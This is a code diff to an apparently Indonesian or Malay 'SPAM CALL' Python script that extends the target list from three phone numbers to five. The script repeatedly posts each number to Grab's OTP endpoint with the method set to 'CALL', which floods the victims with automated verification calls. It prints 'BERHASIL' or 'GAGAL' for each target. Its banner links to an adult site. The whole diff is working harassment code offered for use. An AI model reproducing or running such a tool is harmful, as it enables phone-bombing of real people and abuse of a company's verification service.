@@ -18,9 +18,9 @@ r=('\033[1;31m')
 g=('\033[1;32m')
 w=('\033[1;37m')
 print("""%s
-		         B3RN SPAM CALL%s
+		         Mr.B3RN SPAM CALL%s
  ,_     _‚
- |\\\___//|	%sAuthor: Mr.B3rN%s
+ |\\\___//|	%sAuthor: Mr.B3RN%s
  |=6   6=|	%sContact: https://xhamster.com%s
  \=._Y_.=/	%sGithub: https://github.com/MRram0s%s
   )  `  (    ,	%sTEAM: TOK MUNG SQUARE%s
@@ -34,10 +34,14 @@ print("%s[*] Klik ENTER untuk step seterusnya%s"%(g,g))
 no1 = input("[?] NO TARGET 1 => %s"%(w))
 no2 = input("%s[?] NO TARGET 2 => %s"%(g,w))
 no3 = input("%s[?] NO TARGET 3 => %s"%(g,w))
+no4 = input("%s[?] NO TARGET 4 => %s"%(g,w))
+no5 = input("%s[?] NO TARGET 5 => %s"%(g,w))
 jlmh=int(input("%s[?] JUMLAH SPAM => %s"%(g,w)))
 dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
 dt2={'method':'CALL','countryCode':'id','phoneNumber':no2,'templateID':'pax_android_production'}
 dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'templateID':'pax_android_production'}
+dt4={'method':'CALL','countryCode':'id','phoneNumber':no4,'templateID':'pax_android_production'}
+dt5={'method':'CALL','countryCode':'id','phoneNumber':no5,'templateID':'pax_android_production'}
 
 try:
 	print()
@@ -48,6 +52,8 @@ try:
 		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
 		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
 		r3 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt3)
+		r4 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt4)
+		r5 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt5)
 		if str(idk) in str(r1.text):
 			print("[+] TARGET1 BERHASIL")
 		else:
@@ -60,6 +66,14 @@ try:
 			print("[+] TARGET3 BERHASIL")
 		else:
 			print("[-] TARGET3 GAGAL")
+		if str(idk) in str(r4.text):
+			print("[+] TARGET4 BERHASIL")
+		else:
+			print("[-] TARGET4 GAGAL")
+		if str(idk) in str(r5.text):
+			print("[+] TARGET5 BERHASIL")
+		else:
+			print("[-] TARGET5 GAGAL")
 		print("="*30)
 		time.sleep(1)
 except KeyboardInterrupt:
